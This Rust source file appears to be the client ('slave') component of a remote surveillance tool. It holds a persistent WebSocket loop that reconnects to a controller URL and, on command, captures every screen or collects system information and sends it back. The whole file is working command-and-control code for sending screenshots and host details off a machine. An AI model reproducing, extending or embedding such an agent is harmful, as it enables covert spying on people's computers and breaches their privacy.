use crate::{
    common::messages::{Command, Message, Response},
    slave::surveillance::sysinfo,
};
use futures_util::{SinkExt, StreamExt};
use std::time::Duration;
use tokio::time::sleep;
use tokio_tungstenite::{connect_async, tungstenite::protocol::Message as WsMessage};

use super::surveillance::screen::capture_screens;

const RECONNECT_DELAY: Duration = Duration::from_secs(5);

pub async fn run_slave(url: String) {
    loop {
        match connect_and_handle(&url).await {
            Ok(_) => println!("WebSocket connection closed. Reconnecting..."),
            Err(e) => eprintln!("Error: {}. Reconnecting...", e),
        }
        sleep(RECONNECT_DELAY).await;
    }
}

async fn connect_and_handle(url: &str) -> Result<(), Box<dyn std::error::Error>> {
    let (ws_stream, _) = connect_async(url).await?;
    println!("WebSocket handshake has been successfully completed");

    let (mut write, mut read) = ws_stream.split();

    while let Some(msg) = read.next().await {
        let msg = msg?;
        if let WsMessage::Text(text) = msg {
            let command: Message = serde_json::from_str(&text)?;
            if let Message::Command(cmd) = command {
                let response: Response = handle_command(cmd).await;
                let response_msg = Message::Response(response);
                let json = serde_json::to_string(&response_msg)?;
                write.send(WsMessage::Text(json)).await?;
            }
        }
    }

    Ok(())
}

async fn handle_command(command: Command) -> Response {
    match command {
        Command::CaptureScreens => {
            let screens = capture_screens();
            println!("captured screens, sending...");
            Response::Screens(screens)
        }
        Command::GetSystemInfo => {
            println!("capturing system info");
            Response::SystemInfo(sysinfo::get_system_info())
        }
    }
}
